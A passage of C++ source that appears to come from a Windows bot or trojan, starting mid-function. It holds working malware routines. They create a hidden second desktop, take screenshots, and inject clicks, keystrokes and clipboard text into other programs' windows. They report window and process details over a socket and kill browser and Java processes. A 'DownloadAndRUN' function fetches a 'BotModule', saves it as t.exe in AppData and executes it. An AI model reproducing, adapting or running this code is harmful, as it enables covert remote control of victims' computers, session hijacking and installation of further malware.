			lOfs.QuadPart = lSize.QuadPart = 0;

			if( SUCCEEDED(pStream->Seek( lOfs, STREAM_SEEK_END, &lSize )))
			{
				lOfs.QuadPart = 0;
				if( SUCCEEDED(pStream->Seek( lOfs, STREAM_SEEK_SET, 0 )))
				{
					// assume jpegs are less than 4G :)
					if( lSize.HighPart == 0 )
					{
						*size = lSize.LowPart;
						*size += sizeof(WIN_SHOT);
						if( (*data = (BYTE*)malloc( *size )) )
						{
							WIN_SHOT *p = (WIN_SHOT*)*data;
							p->id = ((WIN_SHOT*)dataBMP)->id;
							p->compression = 2;
							p->imagelength = lSize.LowPart;

							if( SUCCEEDED( pStream->Read( p->imagedata, p->imagelength, 0 )))
							{
								bOk = true;
							}
						}
					}
				}
			}
		}
		pStream->Release();
	}

	return bOk;
}
bool DesktopClick2( int x, int y, bool bDouble,HWND hWnd)
{
	if (hWnd)
	{
		int coord=(y << 16) | x;
		POINT pt={x,y};
//		ClientToScreen(hWnd,&pt);
		SetCursorPos(pt.x,pt.y);
		PostMessage(hWnd,WM_LBUTTONDOWN,MK_LBUTTON,(LPARAM)coord);
		PostMessage(hWnd,WM_LBUTTONUP,0,(LPARAM)coord);
		/*if (hWnd)
		{
			coord = (y << 16) | x;

			//pt.x=0x1;
			//pt.y=0x1;
			//ClientToScreen(hWnd,&pt);
			SetCursorPos(pt.x,pt.y);
			PostMessage(hWnd,WM_LBUTTONDOWN,MK_LBUTTON,(LPARAM)coord);
			PostMessage(hWnd,WM_LBUTTONUP,0,(LPARAM)coord);

		}*/

	}
	return 0;
}

DWORD DesktopClickWrapper(LPVOID param)
{
	POINT ptPrev;
	GetCursorPos( &ptPrev );
	LEFT_CLICK* st = (LEFT_CLICK*)param;
	HDESK hSecondDesktop=CreateDesktopW(SECOND_DESK_NAME,NULL,NULL,DF_ALLOWOTHERACCOUNTHOOK,GENERIC_ALL,NULL);
	BOOL res = SetThreadDesktop(hSecondDesktop);
	if(!res)
	{
		DWORD err = GetLastError();
		DbgMsgW(L"file", err, L"SetThreadDesktop ERROR");
	}

	POINT ptClick;
	ptClick.x = st->x;
	ptClick.y = st->y;
	ClientToScreen((HWND)st->idWindow,&ptClick);


	WINDOWINFO wi;
	::GetWindowInfo((HWND)st->idWindow, &wi);

	int BroderHeight = GetSystemMetrics(SM_CYBORDER);
	if((wi.dwStyle & WS_BORDER) == 0)
		BroderHeight = 0;

	int CaptionHeight = GetSystemMetrics(SM_CYCAPTION);
	if((wi.dwStyle & WS_CAPTION) == 0)
		CaptionHeight = 0;

	DesktopClick2(ptClick.x-BroderHeight, ptClick.y-CaptionHeight-BroderHeight, st->doubleClick,(HWND)st->idWindow);

	SetCursorPos( ptPrev.x, ptPrev.y );
	return 0;
}


bool DesktopClick( int x, int y, bool bDouble )
{
	POINT ptPrev;
	GetCursorPos( &ptPrev );

	int xs = GetSystemMetrics( SM_CXSCREEN );
	int ys = GetSystemMetrics( SM_CYSCREEN );

	POINT ptClick;
	ptClick.x = 65535 * x / xs;
	ptClick.y = 65535 * y / ys;

	//PostMessage(

	mouse_event( MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE, ptClick.x, ptClick.y, 0, 0 );
	Sleep(10);

	mouse_event( MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN, ptClick.x, ptClick.y, 0, 0 );
	Sleep(10);
	mouse_event( MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTUP, ptClick.x, ptClick.y, 0, 0 );
	Sleep(10);

	if( bDouble )
	{
		mouse_event( MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN, ptClick.x, ptClick.y, 0, 0 );
		Sleep(10);
		mouse_event( MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTUP, ptClick.x, ptClick.y, 0, 0 );
		Sleep(10);
	}

	SetCursorPos( ptPrev.x, ptPrev.y );

	return true;
}/*
*/

bool DesktopKeys( int x, int y, TCHAR *s, bool bAddEnter, bool bCtrlA )
{
	if( !DesktopClick( x, y, true ) )
	{
		return false;
	}

	DWORD l = (lstrlen(s) + 1) * 2;
	HANDLE hMem = GlobalAlloc( GMEM_DDESHARE, l );
	LPVOID pMem = GlobalLock( hMem );
	CopyMemory( pMem, s, l );
	GlobalUnlock( hMem );

	if( !OpenClipboard(0) )
	{
		return false;
	}

	EmptyClipboard();
	SetClipboardData( CF_UNICODETEXT, hMem );
	CloseClipboard();

	if( bCtrlA )
	{
		keybd_event(VK_CONTROL, 0,0,0);
		keybd_event('A', 0,0,0);
		Sleep(10);

		keybd_event('A', 0, KEYEVENTF_KEYUP, 0);
		keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
		Sleep(10);
	}

	keybd_event(VK_CONTROL, 0,0,0);
	keybd_event('V', 0,0,0);
	Sleep(10);

	keybd_event('V', 0, KEYEVENTF_KEYUP, 0);
	keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
	Sleep(10);

	if( bAddEnter )
	{
 		keybd_event(VK_RETURN, 0,0,0);
		keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
		Sleep(10);
	}

	return true;
}

void SendMouseClick(HWND hwnd, WORD x1, WORD y1,bool bDBClic,bool bJavaMov)
{
	LPARAM lParam = (y1 << 16) | x1;
	bool sw_java = false;
	if(IsJavaWindow(hwnd))
		sw_java = true;
	::PostMessage (hwnd, WM_MOUSEMOVE,2,lParam);
	if(sw_java)
	{
		//ShowWindow(hwnd, SW_SHOW);
		//Sleep(1000);
		int xScr = GetSystemMetrics( SM_CXSCREEN );
		int yScr = GetSystemMetrics( SM_CYSCREEN );
		//SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0, SWP_NOACTIVATE | SWP_NOSIZE );
		RECT  tmp;
		GetWindowRect(hwnd,&tmp);
		if (bJavaMov)
		{
			MoveWindow(hwnd, 0, 0, tmp.right - tmp.left, tmp.bottom - tmp.top, true);
			//MoveWindow(hwnd, 0, 0, 500, 200, true);
		}
		//Sleep(10);

		::SendMessage (hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
		Sleep(10);
		//::SendMessage (hwnd, WM_LBUTTONUP, NULL, lParam);
		//Sleep(10);
		//::PostMessage (hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
		//Sleep(10);
		::PostMessage (hwnd, WM_LBUTTONUP, NULL, lParam);

		//Sleep(1000);
		if (bJavaMov)
			MoveWindow(hwnd, xScr-(tmp.right - tmp.left), 0, tmp.right - tmp.left, tmp.bottom - tmp.top, true);
		//SetWindowPos(hwnd, HWND_BOTTOM, xScr-11, 10, 0, 0, SWP_NOACTIVATE | SWP_NOSIZE );

		/*Sleep(1000);
		ShowWindow(hwnd, SW_HIDE);*/
	}
	else
	{
		::PostMessage (hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
		Sleep(10);
		::PostMessage (hwnd, WM_LBUTTONUP, NULL, lParam);
	}
	if (bDBClic)
	{
		PostMessage (hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
		Sleep(10);
		PostMessage (hwnd, WM_LBUTTONUP, MK_LBUTTON, lParam);

	}
}

typedef struct TWNDPOINT
{
 HWND hwnd;
 POINT point;
} WNDPOINT, *pWNDPOINT;

void RecWnd(HWND hwnd, int x, int y, pWNDPOINT pwndpoint)
{
	HWND res_hwnd = GetWindow(hwnd, GW_CHILD | GW_HWNDFIRST);
	while( res_hwnd )
	{
		//if(IsWindowVisible(res_hwnd))
		{
			WINDOWPLACEMENT wplace;
			GetWindowPlacement(res_hwnd, &wplace);
			if(x>=wplace.rcNormalPosition.left && x<=wplace.rcNormalPosition.right &&
				y>=wplace.rcNormalPosition.top && y<=wplace.rcNormalPosition.bottom)
			{
				RecWnd(res_hwnd,x-wplace.rcNormalPosition.left,y-wplace.rcNormalPosition.top, pwndpoint);
				return;
			}
		}
	// Get the next window. Use it.
	res_hwnd = GetWindow(res_hwnd, GW_HWNDNEXT);
	}
	pwndpoint->hwnd = hwnd;
	pwndpoint->point.x = x;
	pwndpoint->point.y = y;
	return;
}


////////////////////////////////////////////////////////////////////////////////////
void SendMess(WCHAR* msg, SOCKET s, DWORD timestamp)
{
	Sleep(100);
	PacketBuffer reply;
	reply.Create( PK_CS_PATCH_TERMSRV, timestamp, (wcslen(msg)+1)*sizeof(TCHAR), msg);
	reply.Send( s );
}
WCHAR* GetWndFileName1(HWND hWnd)
{
	WCHAR* szName=(WCHAR*)malloc(MAX_PATH*2+1);
	DWORD dwPID = 0;

	GetWindowThreadProcessId( hWnd, &dwPID);

	HANDLE hTH = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, dwPID);

	if ( hTH != INVALID_HANDLE_VALUE)
	{
		MODULEENTRY32W me = { sizeof( MODULEENTRY32W) };
		if ( Module32FirstW( hTH, &me))
		{
			lstrcpyW(szName,me.szModule);
			//sprintf(szName,"[%s]\n",me.szExePath);
		}
		CloseHandle( hTH);
	}
	return szName;
}

bool ClickedControl(HWND hWnd,int x,int y,bool bDBClic, SOCKET s, DWORD timestamp,bool bJavaMov)
{
	WNDPOINT wndpoint;
	int CaptionHeight = GetSystemMetrics(SM_CYCAPTION);
	WINDOWINFO wi;
	::GetWindowInfo(hWnd, &wi);
	if((wi.dwStyle & WS_CAPTION) == 0)
		CaptionHeight = 0;

	RecWnd(hWnd, x, y-CaptionHeight, &wndpoint);
	TCHAR WndClass[260];
	TCHAR WndTitle[260];
	TCHAR Message[530];
	GetWindowText(wndpoint.hwnd, &WndTitle[0], 260);
	GetClassNameW(wndpoint.hwnd, &WndClass[0], 260);
	WCHAR* NAME =GetWndFileName1(hWnd);
	wsprintf(&Message[0],L"%s [%s] %s", &WndTitle[0], &WndClass[0],&NAME[0]);
	SendMess(&Message[0], s, timestamp);
	SendMouseClick(wndpoint.hwnd, wndpoint.point.x , wndpoint.point.y,bDBClic,bJavaMov);
	return 1;
}




bool WindowClick( DWORD_PTR id, int x, int y )
{
HWND hw = (HWND)id;
	if( !IsWindow(hw) )
	{
		return false;
	}
ShowWindow(hw, SW_SHOW);


	HWND hwRestoreActive = GetActiveWindow();
	HWND hwRestoreFore = GetForegroundWindow();
	HWND hwRestoreFocus = GetFocus();

	WINDOWPLACEMENT wp;
	ZeroMemory( &wp, sizeof(wp) );
	wp.length = sizeof(wp);
	GetWindowPlacement( hw, &wp );
	/*bool bMinimize = (wp.showCmd == SW_SHOWMINIMIZED);

	if( bMinimize )
	{
		SendMessage( hw, WM_SYSCOMMAND, SC_MAXIMIZE, 0 );
		Sleep(200);
	}*/

//ShowCursor(false);


	SetForegroundWindow( hw );
	SetActiveWindow( hw );
	SetWindowPos( hw, HWND_TOP, 0, 0, 0, 0, SWP_NOSIZE|SWP_NOMOVE );
	UpdateWindow( hw );
	SetFocus( hw );

	RECT rcw;
	GetWindowRect( hw, &rcw );
	DesktopClick( rcw.left + x, rcw.top + y, false );
	Sleep(10);

	/*if( bMinimize )
	{
		Sleep(200);
		SendMessage( hw, WM_SYSCOMMAND, SC_MINIMIZE, 0 );
	}
	else*/
	{
		SetWindowPos( hw, HWND_BOTTOM, 0, 0, 0, 0, SWP_NOSIZE|SWP_NOMOVE );
		UpdateWindow( hw );
	}

//ShowCursor(true);
	SetForegroundWindow( hwRestoreFore );
	UpdateWindow( hwRestoreFore );
	SetActiveWindow( hwRestoreActive );
	UpdateWindow( hwRestoreActive );
	SetFocus( hwRestoreFocus );
	UpdateWindow( hwRestoreFocus );
//ShowWindow(hw, SW_HIDE);
	return true;
}
////-----------------------------------------------------------------------------------
void SendToMouseClick(HWND hwnd, WORD x, WORD y,WCHAR *cText, bool bLeft, bool bENTER,bool bIsSend)
{
	LPARAM lParam = (y << 16) | x;

	bool sw_java = false;
	if(IsJavaWindow(hwnd))
		sw_java = true;


	if(bIsSend)
		SendMessage (hwnd, WM_MOUSEMOVE,2,lParam);
	else
		PostMessage (hwnd, WM_MOUSEMOVE,2,lParam);
	if(bLeft)
	{
		if(sw_java)
		{
			SendMessage (hwnd, WM_RBUTTONDOWN, MK_RBUTTON, lParam);//
			Sleep(10);
			//SendMessage (hwnd, WM_RBUTTONUP, MK_RBUTTON, lParam);
			//PostMessage (hwnd, WM_RBUTTONDOWN, MK_RBUTTON, lParam);//
			//Sleep(10);
			PostMessage (hwnd, WM_RBUTTONUP, NULL, lParam);
		}
		else
		{
			if(bIsSend)
			{
				SendMessage (hwnd, WM_RBUTTONDOWN, MK_RBUTTON, lParam);//
				Sleep(10);
				SendMessage (hwnd, WM_RBUTTONUP, MK_RBUTTON, lParam);
			}
			else
			{
				PostMessage (hwnd, WM_RBUTTONDOWN, MK_RBUTTON, lParam);//
				Sleep(10);
				PostMessage (hwnd, WM_RBUTTONUP, NULL, lParam);
			}
		}
		return ;
	}
	for (int i=0;i<wcslen(cText);i++ )
	{
		if (cText[i]==VK_LEFT)
		{
			if(sw_java)
			{
				SendMessage(hwnd, WM_KEYDOWN, VK_LEFT, 0);
				//SendMessage (hwnd, WM_KEYUP, VK_LEFT, 0);
				//PostMessage(hwnd, WM_KEYDOWN, VK_LEFT, 0);
				PostMessage (hwnd, WM_KEYUP, VK_LEFT, 0);
			}
			else
			{
				if(bIsSend)
				{
					SendMessage(hwnd, WM_KEYDOWN, VK_LEFT, 0);
					SendMessage (hwnd, WM_KEYUP, VK_LEFT, 0);
				}
				else
				{
					PostMessage(hwnd, WM_KEYDOWN, VK_LEFT, 0);
					PostMessage (hwnd, WM_KEYUP, VK_LEFT, 0);
				}
			}
		}
		else
		if (cText[i]==0x00000014)//del
		{
			if(sw_java)
			{
				SendMessage(hwnd, WM_KEYDOWN, VK_DELETE, 0x000E0001);
				//SendMessage (hwnd, WM_KEYUP, VK_DELETE, 0xC00E0001);
				//PostMessage(hwnd, WM_KEYDOWN, VK_DELETE, 0x000E0001);
				PostMessage (hwnd, WM_KEYUP, VK_DELETE, 0xC00E0001);
			}
			else
			{
				if(bIsSend)
				{
					SendMessage(hwnd, WM_KEYDOWN, VK_DELETE, 0x000E0001);
					SendMessage (hwnd, WM_KEYUP, VK_DELETE, 0xC00E0001);
				}
				else
				{
					PostMessage(hwnd, WM_KEYDOWN, VK_DELETE, 0x000E0001);
					PostMessage (hwnd, WM_KEYUP, VK_DELETE, 0xC00E0001);
				}
			}
		}else
		if (cText[i]==VK_UP)
		{
			if(sw_java)
			{
				SendMessage(hwnd, WM_KEYDOWN, VK_UP, 0x00F0001);
				//SendMessage (hwnd, WM_KEYUP, VK_UP, 0xC0F0001);
				//PostMessage(hwnd, WM_KEYDOWN, VK_UP, 0x00F0001);
				PostMessage (hwnd, WM_KEYUP, VK_UP, 0xC0F0001);
			}
			else
			{
				if(bIsSend)
				{
					SendMessage(hwnd, WM_KEYDOWN, VK_UP, 0x00F0001);
					SendMessage (hwnd, WM_KEYUP, VK_UP, 0xC0F0001);
				}
				else
				{
					PostMessage(hwnd, WM_KEYDOWN, VK_UP, 0x00F0001);
					PostMessage (hwnd, WM_KEYUP, VK_UP, 0xC0F0001);
				}
			}
		}else
		if (cText[i]==VK_DOWN)
		{
			if(sw_java)
			{
				SendMessage(hwnd, WM_KEYDOWN, VK_DOWN, 0);
				//SendMessage (hwnd, WM_KEYUP, VK_DOWN, 0);
				//PostMessage(hwnd, WM_KEYDOWN, VK_DOWN, 0);
				PostMessage (hwnd, WM_KEYUP, VK_DOWN, 0);
			}
			else
			{
				if(bIsSend)
				{
					SendMessage(hwnd, WM_KEYDOWN, VK_DOWN, 0);
					SendMessage (hwnd, WM_KEYUP, VK_DOWN, 0);
				}
				else
				{
					PostMessage(hwnd, WM_KEYDOWN, VK_DOWN, 0);
					PostMessage (hwnd, WM_KEYUP, VK_DOWN, 0);
				}
			}
		}else
		if (cText[i]==VK_TAB)
		{
			if(sw_java)
			{
				SendMessage(hwnd, WM_KEYDOWN, VK_TAB, 0);
				//SendMessage (hwnd, WM_KEYUP, VK_TAB, 0);
				//PostMessage(hwnd, WM_KEYDOWN, VK_TAB, 0);
				PostMessage (hwnd, WM_KEYUP, VK_TAB, 0);
			}
			else
			{
				if(bIsSend)
				{
					SendMessage(hwnd, WM_KEYDOWN, VK_TAB, 0);
					SendMessage (hwnd, WM_KEYUP, VK_TAB, 0);
				}
				else
				{
					PostMessage(hwnd, WM_KEYDOWN, VK_TAB, 0);
					PostMessage (hwnd, WM_KEYUP, VK_TAB, 0);
				}
			}
		}else if (cText[i]==WM_VSCROLL)
		{
			if(bIsSend)
			{
				SendMessage(hwnd, WM_VSCROLL, 1, 0);
			}
			else
			{
				PostMessage(hwnd, WM_VSCROLL, 1, 0);
			}
		}else


		if(bIsSend)
		{
			SendMessage(hwnd, WM_CHAR,  cText[i], 0);
		}
		else
		{
		//	PostMessage(hwnd, WM_KEYDOWN,  cText[i], 0);
			PostMessage(hwnd, WM_CHAR,  cText[i], 0);
		//	PostMessage(hwnd, WM_KEYUP,  cText[i], 0);
		}

	}
	if (bENTER)
	{
		if(bIsSend)
		{
			SendMessage(hwnd, WM_KEYDOWN, VK_RETURN, 0x001C0001);
			SendMessage(hwnd, WM_KEYUP, VK_RETURN, 0xC01C0001);
		}
		else
		{
			PostMessage(hwnd, WM_KEYDOWN, VK_RETURN, 0x001C0001);
			PostMessage(hwnd, WM_KEYUP, VK_RETURN, 0xC01C0001);
		}

	}
}

////-----------------------------------------------------------------------------------
struct Send_in_Form_Clic
{
	HWND ID_Control;
	DWORD x;
	DWORD y;
	bool isCtrl_A;
	bool isEnter;
	bool bIsSendM;
	WCHAR *pText;
};
BOOL CALLBACK MySendToWindControl(HWND hwnd, LPARAM lParam)
{
    HWND *ChildWnd, DialogWnd;
	RECT rTmp;

Send_in_Form_Clic *pStruct=(Send_in_Form_Clic*)lParam;

	POINT tmp;
	tmp.x=pStruct->x;
	tmp.y=pStruct->y;
	char str[MAX_PATH];
	{
	//	if (hwnd==NULL)break;
		GetClassNameA(hwnd,(LPSTR)&str,MAX_PATH);

		GetClientRect(hwnd,&rTmp);
		if (hwnd==pStruct->ID_Control)
		SendToMouseClick(hwnd, pStruct->x, pStruct->y,pStruct->pText,pStruct->isCtrl_A,pStruct->isEnter,pStruct->bIsSendM);
	}
    return 1;
}



bool WindowKeysToControl( DWORD_PTR id, DWORD_PTR idControl, int x, int y, TCHAR *s, bool bAddEnter, bool bCtrlA,bool bSendM )
{
	HWND hw = (HWND)id;
	if( !IsWindow(hw) )
	{
		return false;
	}

	SendToMouseClick((HWND)idControl, x-5, y,s,bCtrlA,bAddEnter,bSendM);
	return true;

}
////-----------------------------------------------------------------------------------
struct Send_in_Form_Mouse_Clic
{
	HWND ID_Control;
	DWORD x;
	DWORD y;
	bool isLeft;

};
void SendToControlLeftMouseClick(HWND hwnd, WORD x, WORD y, bool isLeft)
{
	LPARAM lParam = (y << 16) | x;
	SendMessage (hwnd, WM_MOUSEMOVE,2,lParam);


	if(isLeft)
	{
		PostMessage (hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);//
		PostMessage (hwnd, WM_LBUTTONUP, MK_LBUTTON, lParam);
	}
	else
	{
		PostMessage (hwnd, WM_RBUTTONDOWN, MK_RBUTTON, lParam);//
		PostMessage (hwnd, WM_RBUTTONUP, MK_RBUTTON, lParam);
	}


}
BOOL CALLBACK MySendLeftClicToWindControl(HWND hwnd, LPARAM lParam)
{
    HWND *ChildWnd, DialogWnd;
	RECT rTmp;

Send_in_Form_Mouse_Clic *pStruct=(Send_in_Form_Mouse_Clic*)lParam;

	POINT tmp;
	tmp.x=pStruct->x;
	tmp.y=pStruct->y;
	char str[MAX_PATH];

	GetClassNameA(hwnd,(LPSTR)&str,MAX_PATH);
	GetClientRect(hwnd,&rTmp);
	if (hwnd==pStruct->ID_Control)
		SendToControlLeftMouseClick(hwnd, pStruct->x, pStruct->y,pStruct->isLeft);

    return 1;
}
bool WindowClicToControl( DWORD_PTR id, DWORD_PTR idControl, int x, int y,bool Left )
{
	HWND hw = (HWND)id;
	if( !IsWindow(hw) )
	{
		return false;
	}
	//SendToControlLeftMouseClick((HWND)idControl, x, y,Left);

	Send_in_Form_Mouse_Clic pStruct;
	pStruct.ID_Control	=	(HWND)idControl;
	pStruct.x			=	x;
	pStruct.y			=	y;
	pStruct.isLeft		=	Left;
	EnumChildWindows((HWND) hw,(WNDENUMPROC) MySendLeftClicToWindControl, (LPARAM)&pStruct);/**/
	return true;

}
////-----------------------------------------------------------------------------------

bool SendToControl(HWND hWnd,int x,int y,WCHAR*pText, bool bAddEnter, bool bLeft)
{
	WNDPOINT wndpoint;
//	RecWnd(hWnd, x, y-GetSystemMetrics(SM_CYCAPTION), &wndpoint);
//	SendToMouseClick(wndpoint.hwnd, wndpoint.point.x, wndpoint.point.y,pText,bLeft,bAddEnter);
	return 1;
}

////-----------------------------------------------------------------------------------
bool WindowKeys( DWORD_PTR id, int x, int y, TCHAR *s, bool bAddEnter, bool bLeft,bool bIsSend )
{
	HWND hw = (HWND)id;
	if( !IsWindow(hw) )
	{
		return false;
	}
	//SendToControl(hw,x,y,s,bAddEnter,bLeft);
	WNDPOINT wndpoint;
	RecWnd(hw, x, y-GetSystemMetrics(SM_CYCAPTION), &wndpoint);

	SendToMouseClick(wndpoint.hwnd, wndpoint.point.x, wndpoint.point.y,s,bLeft,bAddEnter,bIsSend);

	return true;
}
/*void rrrrr()
{
	ProcessorArchitecture pbits = ProcessorArchitecture.Unknown;
	try
	{
		SYSTEM_INFO l_System_Info = new SYSTEM_INFO();
		GetSystemInfo(ref l_System_Info);
		switch (l_System_Info.uProcessorInfo.wProcessorArchitecture)
		{
			case 9: // PROCESSOR_ARCHITECTURE_AMD64
				pbits = ProcessorArchitecture.Bit64;
				break;
			case 6: // PROCESSOR_ARCHITECTURE_IA64
				pbits = ProcessorArchitecture.Itanium64;
				break;
			case 0: // PROCESSOR_ARCHITECTURE_INTEL
				pbits = ProcessorArchitecture.Bit32;
				break;
			default: // PROCESSOR_ARCHITECTURE_UNKNOWN
				pbits = ProcessorArchitecture.Unknown;
			break;
		}
	}
	catch
	{
		Ignore
	}
	return pbits;
}
*/

bool GetOSVersion( OSVERSIONINFOEX *result )
{
	result->dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if( GetVersionEx( (LPOSVERSIONINFO)result ) )
	{
		return true;
	}
	result->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if( GetVersionEx( (LPOSVERSIONINFO)result ) )
	{
		return true;
	}
	ZeroMemory( result, sizeof(*result) );
	return false;
}


void GetJavaVersion( WCHAR *buffer, int buffer_size )
{
	HKEY hk = 0;
	if( RegOpenKeyEx( HKEY_LOCAL_MACHINE, L"SOFTWARE\\JavaSoft\\Java Runtime Environment",
		0, KEY_ALL_ACCESS, &hk ) == ERROR_SUCCESS )
	{
		DWORD dwLen = buffer_size;
		DWORD dwType = REG_SZ;
		RegQueryValueEx( hk, L"BrowserJavaVersion", 0, &dwType, (LPBYTE)buffer, &dwLen );
		RegCloseKey( hk );
	}
	else
	{
		lstrcpy( buffer, L"Not installed" );
	}
}


void KillJava()
{
	DWORD ids[4096] = {0};
	DWORD dwReturned = 0;
	EnumProcesses( ids, sizeof(ids), &dwReturned );

	for( DWORD i=0; i<(dwReturned/sizeof(DWORD)); i++ )
	{
		HANDLE hp = OpenProcess( PROCESS_ALL_ACCESS, FALSE, ids[i] );
		if( hp )
		{
			WCHAR fname[MAX_PATH] = L"";
			GetProcessImageFileName( hp, fname, sizeof(fname)/sizeof(WCHAR)-1 );
			if( wcsstr(fname,L"java.exe") )
			{
				TerminateProcess( hp, 0 );
			}
			CloseHandle( hp );
		}
	}
}
bool KillProcByPid(DWORD pid)
{
	DWORD ExitCode;
	HANDLE hp;
	bool ret = true;

	if(pid)
    {
		hp = OpenProcess(PROCESS_ALL_ACCESS, true, pid);
        if (hp)
		{
			GetExitCodeProcess(hp, &ExitCode);
			ret = TerminateProcess(hp, ExitCode);
		}
        else
        {
			return false;
        }
	}
	else
    {
		return false;
	}

	CloseHandle(hp);
	return ret;
}

void KillIE_FF_OP(SOCKET s, DWORD timestamp)
{
	DWORD ids[1024] = {0};
	DWORD dwReturned = 0;
	EnumProcesses( ids, sizeof(ids), &dwReturned );

	for( DWORD i=0; i<(dwReturned/sizeof(DWORD)); i++ )
	{
		HANDLE hp = OpenProcess( PROCESS_ALL_ACCESS, FALSE, ids[i] );
		if( hp )
		{
			WCHAR fname[MAX_PATH] = L"";
			GetProcessImageFileName( hp, fname, sizeof(fname)/sizeof(WCHAR)-1 );
			wcscpy(&fname[0], wcslwr(fname));
			if( wcsstr(fname,L"\\iexplore.exe") ||wcsstr(fname,L"\\chrome.exe")||wcsstr(fname,L"\\opera.exe")||wcsstr(fname,L"\\firefox.exe")||wcsstr(fname,L"\\plugin-container.exe") )
			{
				BOOL res = TerminateProcess( hp, 0 );
				WCHAR msg[256] = {0};
				WCHAR Filename[50];
				_wsplitpath(&fname[0],NULL,NULL,Filename,NULL);
				if(res)
				{
					wcscpy(&msg[0], L"Process killed: ");
					wcscat(&msg[0], &Filename[0]);
				}
				else
				{
					wcscpy(&msg[0], L"Can`t kill proc: ");
					wcscat(&msg[0], &Filename[0]);
				}
				Sleep(100);
				PacketBuffer reply;
				reply.Create( PK_CS_PATCH_TERMSRV, timestamp, (wcslen(msg)+1)*sizeof(TCHAR), msg);
				reply.Send( s );
			}
			CloseHandle( hp );
		}
	}
}

bool DownloadAndRUN(char *DownloadF)
{
	LPBYTE BotModule  = NULL;
	DWORD dwLen;
	if ( !DownloadInMem( DownloadF, &BotModule, &dwLen ) )
	{
		return NULL;
	}
	FileCreateInFolder(0x001a,L"t.exe", BotModule, dwLen);
	WCHAR SysPath[MAX_PATH];
	SHGetFolderPathW(NULL, 0x001a, NULL, SHGFP_TYPE_CURRENT, SysPath);
	lstrcatW( SysPath, L"\\" );
	lstrcatW( SysPath,L"t.exe"  );
	ShellExecuteW(0,L"open",SysPath,NULL,NULL,SW_SHOW);
}